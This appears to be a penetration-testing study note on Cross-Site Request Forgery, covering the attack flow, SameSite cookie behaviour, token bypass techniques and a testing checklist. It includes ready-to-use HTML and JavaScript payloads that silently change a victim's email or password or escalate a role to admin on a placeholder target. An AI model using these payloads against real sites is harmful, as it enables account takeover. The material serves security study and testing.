2026-02-04 17:44

Status:

Tags:[[eWPTX]] [[Authentication]] [[Session Management]] [[CSRF]]
###### Prerequisites: [[Session Management Testing]]
# Cross-Site Request Forgery (CSRF)

## Overview

CSRF occurs when an attacker tricks a user's browser into sending a state-changing request to a target application while the user is authenticated. It abuses the fact that browsers automatically attach cookies (including session cookies) to every request made to a domain, regardless of the origin that initiated the request.

---

## Typical Attack Flow

1. The attacker identifies a state-changing endpoint with no CSRF protection (e.g., `POST /account/change-email`).
2. The attacker crafts a malicious page containing a request to that endpoint.
3. The attacker lures an authenticated victim to visit the malicious page (phishing, forum post, ad, etc.).
4. The victim's browser sends the request with the victim's session cookies attached.
5. The server processes the request as legitimate because the session is valid.

---

## Impact Examples

- Change email or password (account takeover chain).
- Perform financial transactions or transfers.
- Modify account settings or permissions.
- Add an attacker-controlled admin account.
- Trigger API actions on behalf of the user.

---

## HTML POC Templates

### Auto-Submit Form (POST-based CSRF)

The most common CSRF POC. The hidden form auto-submits on page load:

```html
<html>
<body>
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="evil@attacker.com" />
    <input type="hidden" name="confirm" value="1" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### Image Tag (GET-based CSRF)

For endpoints that accept state-changing GET requests:

```html
<img src="https://target.com/api/change-email?email=evil@attacker.com" style="display:none" />
```

This fires automatically when the page loads. No JavaScript is needed.

### XHR-Based CSRF (XMLHttpRequest)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/change-password", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("new_password=hacked123&confirm_password=hacked123");
</script>
```

### Fetch API CSRF

```html
<script>
fetch("https://target.com/api/change-password", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "new_password=hacked123&confirm_password=hacked123"
});
</script>
```

> **Note:** XHR and Fetch POCs are subject to CORS preflight checks when using non-simple content types. If the server does not allow the attacker's origin, the browser blocks the request.

---

## JSON CSRF (Content-Type Bypass)

Many modern APIs expect `Content-Type: application/json`. Browsers send a CORS preflight (`OPTIONS`) for this content type, which usually blocks CSRF. However, there are bypass techniques:

### Using Form enctype

HTML forms support three `enctype` values. By abusing `text/plain`, you can smuggle JSON-like payloads:

```html
<form action="https://target.com/api/update-profile" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"evil@attacker.com","ignore":"' value='"}' />
</form>
<script>document.forms[0].submit();</script>
```

The resulting body sent by the browser is:

```
{"email":"evil@attacker.com","ignore":"="}
```

This works if the server parses the body as JSON regardless of the `Content-Type` header, or if it accepts `text/plain` as a valid content type for JSON parsing.

### Using Navigator.sendBeacon

```html
<script>
const blob = new Blob(['{"email":"evil@attacker.com"}'], { type: "application/json" });
navigator.sendBeacon("https://target.com/api/update-profile", blob);
</script>
```

`sendBeacon` sends a POST request with the specified content type. It does not trigger a preflight in some browser implementations, though modern browsers have largely patched this behavior.

---

## SameSite Cookie Bypass Scenarios

The `SameSite` cookie attribute is the primary browser-level defense against CSRF:

| Value    | Behavior                                                                 |
| -------- | ------------------------------------------------------------------------ |
| `Strict` | Cookie is never sent on cross-site requests.                             |
| `Lax`    | Cookie is sent on top-level navigations (GET only). Default in modern browsers. |
| `None`   | Cookie is always sent cross-site (requires `Secure` flag).               |

### Bypassing SameSite=Lax

`Lax` allows cookies on **top-level GET navigations**. If the target accepts state-changing GET requests, CSRF is still possible:

```html
<!-- Top-level navigation triggers Lax cookie inclusion -->
<a href="https://target.com/account/change-role?role=admin" id="csrf-link">Click here</a>
<script>document.getElementById('csrf-link').click();</script>
```

Or using a full-page redirect:

```html
<script>window.location = "https://target.com/account/change-role?role=admin";</script>
```

### Other SameSite Bypass Scenarios

- **Subdomain takeover:** If the attacker controls a subdomain of the target (e.g., `evil.target.com`), requests from the subdomain are considered same-site.
- **Method override:** Some frameworks accept `POST` actions via `GET` if a `_method=POST` parameter is present, allowing Lax bypass via top-level GET navigation.
- **2-minute Lax window:** Chromium browsers allow top-level POST with cookies for 2 minutes after a cookie is set without an explicit SameSite attribute (to avoid breaking SSO flows).

---

## CSRF Token Bypass Techniques

When a CSRF token is present, test these bypasses:

### 1. Empty Token Value

Submit the request with an empty `csrf_token=` parameter. Some implementations only check if the parameter exists, not its value.

### 2. Remove the Token Parameter Entirely

Delete the `csrf_token` parameter from the request. Some servers skip validation if the parameter is absent.

### 3. Token from Another Session

Use a CSRF token generated from a different user session. If tokens are not bound to the session, any valid token works.

### 4. Reuse a Previous Token

Submit a token that was valid in a previous request. If the server does not invalidate tokens after use, replay is possible.

### 5. Swap HTTP Method

If the POST endpoint validates CSRF tokens but the same action is available via GET (which may not validate tokens), switch the method:

```
POST /change-email  (CSRF token required)
GET  /change-email?email=evil@attacker.com  (no CSRF token check)
```

### 6. Token in Cookie vs. Body Mismatch

When the server compares a cookie token against a body token (double-submit pattern), test if you can set the cookie via a subdomain or header injection and match it with an arbitrary body value.

---

## What to Test

- **CSRF token presence:** Is a token included in every state-changing request?
- **CSRF token validation:** Is the token actually validated server-side, or just checked for existence?
- **Token binding:** Is the token tied to the user's session? Can a token from session A be used in session B?
- **Token rotation:** Is the token rotated after each use, or is it static for the entire session?
- **SameSite attribute:** What SameSite value is set on session cookies? Is it `Strict`, `Lax`, or `None`?
- **State-changing GET requests:** Are any state-changing actions reachable via GET?
- **Content-Type enforcement:** Does the API strictly enforce `application/json`, or does it accept `text/plain` and `application/x-www-form-urlencoded`?
- **Referer / Origin validation:** Does the server validate the `Origin` or `Referer` header? Can it be bypassed by omitting the header (e.g., `<meta name="referrer" content="no-referrer">`)?
- **Custom headers:** Does the server require a custom header (e.g., `X-Requested-With`) that cannot be set cross-origin without CORS approval?
